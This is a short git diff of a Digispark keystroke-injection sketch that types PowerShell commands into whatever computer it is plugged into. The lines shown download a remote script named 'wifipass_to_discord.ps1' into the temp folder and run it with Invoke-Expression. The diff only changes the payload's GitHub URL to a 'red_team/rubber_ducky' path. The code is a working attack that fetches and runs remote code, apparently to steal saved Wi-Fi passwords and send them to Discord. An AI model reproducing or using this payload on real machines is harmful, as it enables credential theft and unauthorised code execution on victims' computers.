@@ -32,7 +32,7 @@ void loop() {
   DigiKeyboard.delay(500);
   DigiKeyboard.println("A");
   DigiKeyboard.delay(500);
-  DigiKeyboard.println("(New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/SaltyMoku/Code-Trashcan/main/powershell/wifipass_to_discord.ps1',$env:TEMP+'\\payload.ps1')");
+  DigiKeyboard.println("(New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/SaltyMoku/Reference/main/notes/red_team/rubber_ducky/wifipass_to_discord.ps1',$env:TEMP+'\\payload.ps1')");
   DigiKeyboard.delay(500);
   DigiKeyboard.println("Invoke-Expression -Command $env:TEMP\\payload.ps1");
   DigiKeyboard.delay(500);
